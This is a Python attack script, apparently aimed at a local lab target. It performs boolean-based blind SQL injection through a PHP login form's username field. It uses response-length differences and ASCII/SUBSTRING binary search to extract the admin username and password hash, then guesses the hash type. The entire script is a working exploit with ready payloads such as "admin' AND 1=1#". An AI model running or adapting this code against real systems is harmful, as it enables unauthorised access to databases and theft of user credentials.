import requests
import time

# Configuration
target_url = "http://127.0.0.1:33210/index.php"
session_cookie = "pr8716h5ra06p5lchf9osb22qr"

# Setup session
session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

# Headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print("="*60)
print("Boolean-Based Blind SQL Injection - Admin Credential Extractor")
print("="*60)

# First, let's understand the response patterns
def test_injection(payload):
    """Test a payload and return response characteristics"""
    data = {
        "username": payload,
        "password": "anything",
        "submit": "Login"
    }
    
    try:
        response = session.post(target_url, data=data, headers=headers, allow_redirects=False)
        return {
            "status_code": response.status_code,
            "content_length": len(response.content),
            "text": response.text,
            "headers": dict(response.headers)
        }
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return None

# Test baseline responses
print("[+] Testing baseline responses...")

# Test 1: Valid admin user (assuming 'admin' exists)
print("\n[1] Testing with 'admin' username:")
baseline_admin = test_injection("admin")
print(f"    Status: {baseline_admin['status_code']} | Length: {baseline_admin['content_length']}B")

# Test 2: Invalid user
print("\n[2] Testing with invalid username:")
baseline_invalid = test_injection("nonexistentuser12345")
print(f"    Status: {baseline_invalid['status_code']} | Length: {baseline_invalid['content_length']}B")

# Test 3: Always false condition
print("\n[3] Testing with always false condition:")
baseline_false = test_injection("admin' AND 1=2#")
print(f"    Status: {baseline_false['status_code']} | Length: {baseline_false['content_length']}B")

# Test 4: Always true condition
print("\n[4] Testing with always true condition:")
baseline_true = test_injection("admin' AND 1=1#")
print(f"    Status: {baseline_true['status_code']} | Length: {baseline_true['content_length']}B")

# Determine true/false indicators
true_indicator = baseline_true['content_length']
false_indicator = baseline_false['content_length']

print(f"\n[+] True condition length: {true_indicator}B")
print(f"[+] False condition length: {false_indicator}B")
print(f"[+] Difference: {abs(true_indicator - false_indicator)}B")

def boolean_query(condition):
    """Execute a boolean query and return True if condition is met"""
    payload = f"admin' AND {condition}#"
    result = test_injection(payload)
    
    if result is None:
        return False
    
    # If result length matches true indicator, condition is true
    return result['content_length'] == true_indicator

# Extract data using binary search
def extract_data(column, table, max_length=50):
    """Extract string data using binary search"""
    extracted = ""
    
    print(f"\n[+] Extracting {column} from {table}...")
    
    for position in range(1, max_length + 1):
        low = 32  # Space character
        high = 126  # Tilde character
        char_found = False
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if ASCII value at position is greater than mid
            condition = f"ASCII(SUBSTRING({column},{position},1)) > {mid}"
            
            if boolean_query(condition):
                low = mid + 1
            else:
                # Test if ASCII value at position equals mid
                condition_eq = f"ASCII(SUBSTRING({column},{position},1)) = {mid}"
                if boolean_query(condition_eq):
                    extracted_char = chr(mid)
                    extracted += extracted_char
                    print(f"    Position {position}: '{extracted_char}' (ASCII: {mid})")
                    char_found = True
                    break
                else:
                    high = mid - 1
        
        if not char_found:
            # If no character found, might be NULL or end of string
            # Test if this position is empty
            condition_null = f"SUBSTRING({column},{position},1) = ''"
            if boolean_query(condition_null):
                print(f"    Position {position}: End of string reached")
                break
            else:
                # Try to get the actual character with a direct approach
                for test_char in range(32, 127):
                    condition_test = f"ASCII(SUBSTRING({column},{position},1)) = {test_char}"
                    if boolean_query(condition_test):
                        extracted_char = chr(test_char)
                        extracted += extracted_char
                        print(f"    Position {position}: '{extracted_char}' (ASCII: {test_char})")
                        char_found = True
                        break
                
                if not char_found:
                    print(f"    Position {position}: Could not determine character")
                    extracted += "?"
    
    return extracted

# Step 1: Extract admin username
print("\n" + "="*60)
print("STEP 1: Extracting Admin Username")
print("="*60)

# First, let's find the admin username by checking for 'admin'
print("[+] Checking if 'admin' user exists...")
if boolean_query("username = 'admin'"):
    print("[+] Confirmed: 'admin' user exists!")
    extracted_username = extract_data("username", "users WHERE username = 'admin'")
else:
    print("[-] 'admin' user not found, searching for other admin accounts...")
    # Try to extract first username from users table
    extracted_username = extract_data("username", "users LIMIT 1")

print(f"\n[!] EXTRACTED USERNAME: '{extracted_username}'")

# Step 2: Extract password hash
print("\n" + "="*60)
print("STEP 2: Extracting Admin Password Hash")
print("="*60)

# Get the password hash for the extracted username
if extracted_username:
    extracted_password = extract_data("password", f"users WHERE username = '{extracted_username}'", max_length=64)
    print(f"\n[!] EXTRACTED PASSWORD HASH: '{extracted_password}'")
    print(f"[+] Hash length: {len(extracted_password)} characters")
else:
    extracted_password = ""
    print("[-] Could not extract username, skipping password extraction")

# Step 3: Analyze hash type
print("\n" + "="*60)
print("STEP 3: Hash Type Analysis")
print("="*60)

if extracted_password:
    hash_length = len(extracted_password)
    print(f"[+] Hash: {extracted_password}")
    print(f"[+] Length: {hash_length} characters")
    
    if hash_length == 32:
        print("[+] Likely MD5 hash (32 hex characters)")
        hash_type = "MD5"
    elif hash_length == 40:
        print("[+] Likely SHA1 hash (40 hex characters)")
        hash_type = "SHA1"
    elif hash_length == 64:
        print("[+] Likely SHA256 hash (64 hex characters)")
        hash_type = "SHA256"
    else:
        print("[-] Unknown hash type")
        hash_type = "Unknown"
else:
    hash_type = "Unknown"
    print("[-] No password hash extracted")

